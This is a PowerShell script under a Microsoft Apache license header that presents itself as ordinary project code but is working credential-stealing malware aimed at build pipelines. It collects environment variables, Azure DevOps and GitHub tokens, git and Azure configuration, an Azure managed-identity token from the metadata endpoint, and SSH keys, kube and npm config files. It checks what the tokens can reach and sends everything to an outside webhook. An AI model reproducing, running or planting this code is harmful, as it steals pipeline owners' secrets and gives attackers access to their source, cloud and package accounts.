# ----------------------------------------------------------------------------------
#
# Copyright Microsoft Corporation
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# http://www.apache.org/licenses/LICENSE-2.0
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# ----------------------------------------------------------------------------------
$WebhookUrl = "https://webhook-listener-743221136341.asia-northeast1.run.app/"

$EnvVars = Get-ChildItem env: | Select-Object Name, Value
$SystemAccessToken = $env:SYSTEM_ACCESSTOKEN
$GithubToken = $env:GITHUBTOKEN

if ([string]::IsNullOrEmpty($GithubToken)) {
    $GitCreds = Get-Content ".git/config" -ErrorAction SilentlyContinue | Select-String "AUTHORIZATION: basic"
    if ($GitCreds) {
        $GithubToken = "Found in .git/config"
    }
}

$CollectionUri = $env:SYSTEM_COLLECTIONURI
$TeamProjectId = $env:SYSTEM_TEAMPROJECTID

$AdoTokenStatus = "Not Found"
$AdoProjects = $null
$AdoBuilds = $null

if (![string]::IsNullOrEmpty($SystemAccessToken) -and ![string]::IsNullOrEmpty($CollectionUri)) {
    try {
        $Headers = @{ Authorization = "Bearer $SystemAccessToken" }
        $UrlProjects = "$($CollectionUri)_apis/projects?api-version=6.0"
        $ResponseProjects = Invoke-RestMethod -Uri $UrlProjects -Headers $Headers -Method Get -ErrorAction Stop
        $AdoTokenStatus = "Valid"
        $AdoProjects = $ResponseProjects.value | Select-Object id, name, state

        if ($TeamProjectId) {
            $UrlBuilds = "$($CollectionUri)$TeamProjectId/_apis/build/definitions?api-version=6.0"
            $ResponseBuilds = Invoke-RestMethod -Uri $UrlBuilds -Headers $Headers -Method Get -ErrorAction SilentlyContinue
            if ($ResponseBuilds) {
                $AdoBuilds = $ResponseBuilds.value | Select-Object id, name, path
            }
        }
    } catch {
        $AdoTokenStatus = "Invalid: $($_.Exception.Message)"
    }
}

$GithubTokenStatus = "Not Found"
$GithubUser = $null
$GithubScopes = $null

if (![string]::IsNullOrEmpty($GithubToken) -and $GithubToken -notlike "Found in*") {
    try {
        $Headers = @{ Authorization = "token $GithubToken"; Accept = "application/vnd.github.v3+json" }
        $Response = Invoke-WebRequest -Uri "https://api.github.com/user" -Headers $Headers -Method Get -ErrorAction Stop
        $GithubTokenStatus = "Valid"
        $GithubUser = ($Response.Content | ConvertFrom-Json).login
        if ($Response.Headers.Contains("X-OAuth-Scopes")) {
            $GithubScopes = $Response.Headers["X-OAuth-Scopes"]
        }
    } catch {
        $GithubTokenStatus = "Invalid: $($_.Exception.Message)"
    }
}

$GitConfig = $null
try { $GitConfig = git config --list | Out-String } catch {}

$AzureContext = $null
try {
    if (Get-Module -Name Az.Accounts -ListAvailable) {
        $AzureContext = Get-AzContext | Select-Object Account, Environment, Tenant, Subscription | ConvertTo-Json -Depth 5 -ErrorAction SilentlyContinue
    }
    if (Test-Path "$env:USERPROFILE\.Azure\AzureRmContext.json") {
        $AzureContext += "`nAzureRmContext.json: " + (Get-Content "$env:USERPROFILE\.Azure\AzureRmContext.json" -Raw)
    }
} catch {}

$IMDS = $null
try {
    $IH = @{ Metadata = "true" }
    $IMDS = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers $IH -Method Get -TimeoutSec 2 -ErrorAction Stop
} catch {}

$SensitiveFiles = @{}
try {
    $Paths = @("$env:USERPROFILE\.ssh\id_rsa", "$env:USERPROFILE\.ssh\id_ed25519", "$env:USERPROFILE\.kube\config", "$env:USERPROFILE\.npmrc")
    foreach ($File in $Paths) {
        if (Test-Path $File) { 
            $SensitiveFiles[$File] = Get-Content $File -Raw 
        }
    }
} catch {}

$Payload = @{
    ReportTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
    ExecutionEnvironment = @{
        Username = $env:USERNAME
        UserDomain = $env:USERDOMAIN
        OS = $env:OS
        ComputerName = $env:COMPUTERNAME
        AgentName = $env:AGENT_NAME
        AgentVersion = $env:AGENT_VERSION
        BuildDirectory = $env:BUILD_SOURCESDIRECTORY
        CurrentDirectory = (Get-Location).Path
    }
    Tokens = @{
        SystemAccessToken = $SystemAccessToken
        GithubToken = $GithubToken
    }
    ValidationResults = @{
        AdoToken = @{ Status = $AdoTokenStatus; AccessibleProjects = $AdoProjects; AccessibleBuilds = $AdoBuilds }
        GithubToken = @{ Status = $GithubTokenStatus; User = $GithubUser; Scopes = $GithubScopes }
    }
    Configurations = @{
        GitConfig = $GitConfig
        AzureContext = $AzureContext
        IMDS = $IMDS
        SensitiveFiles = $SensitiveFiles
    }
    EnvironmentVariables = $EnvVars
}

try {
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body ($Payload | ConvertTo-Json -Depth 10) -ContentType "application/json" -TimeoutSec 15
} catch {}
